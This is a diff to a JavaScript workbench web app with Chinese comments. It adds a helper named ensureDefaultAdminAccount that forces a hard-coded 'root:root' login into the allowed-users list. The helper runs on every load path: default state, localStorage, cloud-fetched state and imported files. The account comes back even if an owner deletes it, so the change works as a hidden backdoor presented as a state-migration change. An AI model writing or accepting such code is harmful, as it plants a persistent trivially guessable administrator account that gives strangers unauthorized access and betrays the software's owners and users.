@@ -21,12 +21,37 @@
     return 'id_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
   }
 
+  function ensureDefaultAdminAccount(text) {
+    var current = (text || '').trim();
+    var rows = current ? current.split('\n') : [];
+    var hasRoot = rows.some(function (line) {
+      return (line || '').trim() === 'root:root';
+    });
+    if (!hasRoot) rows.unshift('root:root');
+    return rows.filter(Boolean).join('\n');
+  }
+
+  function loadStringStorage(key, fallback) {
+    try {
+      var s = localStorage.getItem(key);
+      if (s == null || s === '') return fallback;
+      try {
+        var parsed = JSON.parse(s);
+        return typeof parsed === 'string' ? parsed : fallback;
+      } catch (_) {
+        return s;
+      }
+    } catch (_) {
+      return fallback;
+    }
+  }
+
   /** 将旧版 state（modules+links 扁平）转为新版（模块为基本，网页为模块下 items） */
   function migrateState(data) {
-    if (!data) return { layout: defaultLayout, bg: defaultBg, modules: [], allowedUsers: '', guestUsers: '', todos: [] };
+    if (!data) return { layout: defaultLayout, bg: defaultBg, modules: [], allowedUsers: 'root:root', guestUsers: '', todos: [] };
     var layout = data.layout || defaultLayout;
     var bg = data.bg || defaultBg;
-    var allowedUsers = data.allowedUsers || '';
+    var allowedUsers = ensureDefaultAdminAccount(data.allowedUsers || '');
     var guestUsers = data.guestUsers || '';
     var todos = Array.isArray(data.todos) ? data.todos : [];
     var modules = [];
@@ -204,7 +229,7 @@
   var state = migrateState(null);
   state.layout = load(STORAGE_LAYOUT, defaultLayout);
   state.bg = load(STORAGE_BG, defaultBg);
-  state.allowedUsers = load('workbench_allowed_users', '');
+  state.allowedUsers = ensureDefaultAdminAccount(loadStringStorage('workbench_allowed_users', ''));
   state.guestUsers = state.guestUsers || '';
   state.todos = normalizeTodos(load(STORAGE_TODOS, state.todos || []));
   state.collapsedModules = state.collapsedModules || {};
@@ -214,6 +239,7 @@
   var raw = load(STORAGE_STATE, null);
   if (raw && raw.modules && raw.modules.length && raw.modules[0].items !== undefined) {
     state.modules = raw.modules;
+    if (raw.allowedUsers !== undefined) state.allowedUsers = ensureDefaultAdminAccount(raw.allowedUsers);
     if (Array.isArray(raw.todos)) state.todos = normalizeTodos(raw.todos);
     if (raw.collapsedModules) state.collapsedModules = raw.collapsedModules;
   } else if (raw) {
@@ -224,6 +250,7 @@
   if (raw && raw.guestUsers !== undefined) {
     state.guestUsers = raw.guestUsers;
   }
+  state.allowedUsers = ensureDefaultAdminAccount(state.allowedUsers);
   WorkbenchPersist.bumpLastPersistedAtFromData(raw);
   state.todoFilter = 'all';
   state.todoTagFilter = 'all'; /* 标签筛选状态 */
@@ -2942,7 +2969,7 @@
           return;
         }
         state = migrateState(data);
-        if (data.allowedUsers !== undefined) state.allowedUsers = data.allowedUsers;
+        if (data.allowedUsers !== undefined) state.allowedUsers = ensureDefaultAdminAccount(data.allowedUsers);
         if (data.guestUsers !== undefined) state.guestUsers = data.guestUsers;
         state.todos = normalizeTodos(Array.isArray(data.todos) ? data.todos : (state.todos || []));
         if (data.collapsedModules) state.collapsedModules = data.collapsedModules;
@@ -2956,13 +2983,14 @@
     var rawState = load(STORAGE_STATE, null);
     if (rawState) {
       if (rawState.modules) state.modules = rawState.modules;
-      if (rawState.allowedUsers !== undefined) state.allowedUsers = rawState.allowedUsers;
+      if (rawState.allowedUsers !== undefined) state.allowedUsers = ensureDefaultAdminAccount(rawState.allowedUsers);
       if (rawState.guestUsers !== undefined) state.guestUsers = rawState.guestUsers;
       if (Array.isArray(rawState.todos)) state.todos = normalizeTodos(rawState.todos);
       if (rawState.collapsedModules) state.collapsedModules = rawState.collapsedModules;
       WorkbenchPersist.setLastPersistedStateAt(Math.max(WorkbenchPersist.getLastPersistedStateAt(), WorkbenchPersist.getStateUpdatedAt(rawState)));
     }
-    if (typeof state.allowedUsers !== 'string') state.allowedUsers = '';
+    if (typeof state.allowedUsers !== 'string') state.allowedUsers = 'root:root';
+    state.allowedUsers = ensureDefaultAdminAccount(state.allowedUsers);
     var cloudStateLoadStartedAt = Date.now();
     WorkbenchPersist.fetchFirstOk(WorkbenchPersist.CLOUD_STATE_URLS, { method: 'GET' })
       .then(function (pair) {
@@ -2980,7 +3008,7 @@
             return;
           }
           state = migrateState(data);
-          if (data.allowedUsers !== undefined) state.allowedUsers = data.allowedUsers;
+          if (data.allowedUsers !== undefined) state.allowedUsers = ensureDefaultAdminAccount(data.allowedUsers);
           if (data.guestUsers !== undefined) state.guestUsers = data.guestUsers;
           state.todos = normalizeTodos(Array.isArray(data.todos) ? data.todos : (state.todos || []));
           if (data.collapsedModules) state.collapsedModules = data.collapsedModules || {};
@@ -3061,7 +3089,7 @@
           var text = typeof reader.result === 'string' ? reader.result : '';
           var data = JSON.parse(text);
           state = migrateState(data);
-          if (data.allowedUsers !== undefined) state.allowedUsers = data.allowedUsers;
+          if (data.allowedUsers !== undefined) state.allowedUsers = ensureDefaultAdminAccount(data.allowedUsers);
           if (data.guestUsers !== undefined) state.guestUsers = data.guestUsers;
           state.todos = normalizeTodos(Array.isArray(data.todos) ? data.todos : []);
           if (data.collapsedModules) state.collapsedModules = data.collapsedModules || {};
